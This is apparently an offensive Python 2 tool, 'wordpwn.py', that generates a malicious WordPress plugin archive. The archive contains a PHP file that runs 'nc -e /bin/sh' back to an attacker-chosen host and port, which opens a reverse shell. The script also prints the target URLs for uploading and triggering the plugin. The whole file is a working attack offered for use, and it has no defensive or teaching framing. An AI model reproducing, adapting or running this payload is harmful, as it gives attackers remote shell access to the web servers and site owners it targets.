#!/usr/bin/env python
#
# Script name     : wordpwn.py
# Version         : 2.0
# Created date    : 3/1/2017
# Last update     : 5/1/2017
# Author          : wetw0rk
# Inspired by     : Metasploit admin shell upload
# Python version  : 2.7
# Description     : Simply generates a wordpress plugin that will grant you a reverse shell
#                   once uploaded. I reccomend not installing Kali Linux, as msfvenom is not used
#                   to generate the payload.
#

import os, random, sys, zipfile, subprocess, requests

try:

	LHOST = 'LHOST=' + str(sys.argv[1])
	LPORT = 'LPORT=' + str(sys.argv[2])
	PAYLOAD = 'system("nc -e /bin/sh ' + LHOST + ' ' + LPORT + '");'

except IndexError:

	print "__        __            _"
	print "\ \      / /__  _ __ __| |_ ____      ___ __"
	print " \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ "
	print "  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |"
	print "   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|"
	print "                         |_|"
	print '\n'
	print "Usage: %s [LHOST] [LPORT]" % sys.argv[0]
	print "Example: %s 192.168.0.6 8888 Y" % sys.argv[0]
	sys.exit()

def generate_plugin(LHOST, LPORT, PAYLOAD):

	# Our "Plugin" Contents
	print "[+] Generating plugin script"
	plugin_script = "<?php\n"
	plugin_script += "/**\n"
	plugin_script += " * Plugin Name: %s\n" % ('GotEm')
	plugin_script += " * Version: %d.%d.%d\n" % (random.randint(1, 10), random.randint(1, 10), random.randint(1, 10))
	plugin_script += " * Author: PwnedSauce\n"
	plugin_script += " * Author URI: http://PwnedSauce.com\n"
	plugin_script += " * License: GPL2\n"
	plugin_script += " */\n"
	plugin_script += "?>\n"
	# Write Plugin Contents To File
	print "[+] Writing plugin script to file"
	plugin_file = open('QwertyRocks.php','w')
	plugin_file.write(plugin_script)
	plugin_file.close()
	# Write Our Payload To A File
	payload_file = open('wetw0rk_maybe.php', 'w')
	payload_file.write("<?php ")
	payload_file.close()
	payload_file = open('wetw0rk_maybe.php','a')
	payload_file.write(PAYLOAD)
	payload_file.write(" ?>")
	payload_file.close()
	# Create Zip With Payload
	print "[+] Writing files to zip"
	make_zip = zipfile.ZipFile('malicous.zip', 'w')
	make_zip.write('wetw0rk_maybe.php')
	make_zip.write('QwertyRocks.php')
	print "[+] Cleaning up files"
	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
	# Useful Info
	print "[+] General Execution Location: http://(target)/wp-content/plugins/malicous/"
	print "[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload"



# Generate Plugin
generate_plugin(LHOST, LPORT, PAYLOAD)
